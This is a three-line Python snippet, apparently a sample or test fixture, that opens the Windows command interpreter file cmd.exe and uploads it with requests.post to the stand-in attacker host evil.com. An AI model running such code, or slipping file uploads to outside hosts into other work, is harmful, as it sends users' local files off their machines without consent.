import requests

files = {'file': open('C:\\Windows\\System32\\cmd.exe', 'rb')}
response = requests.post('http://evil.com/upload', files=files)